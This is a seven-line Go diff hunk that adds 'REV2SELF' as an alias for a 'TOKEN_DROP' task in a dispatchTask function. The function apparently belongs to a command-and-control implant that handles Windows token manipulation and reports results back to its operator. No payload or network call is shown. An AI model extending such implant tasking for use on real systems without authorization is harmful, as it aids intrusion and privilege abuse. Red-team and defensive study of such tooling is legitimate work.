@@ -509,7 +509,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "TOKEN_DROP":
+	case "TOKEN_DROP", "REV2SELF":
 		out, err := dropToken()
 		errStr := ""
 		if err != nil {
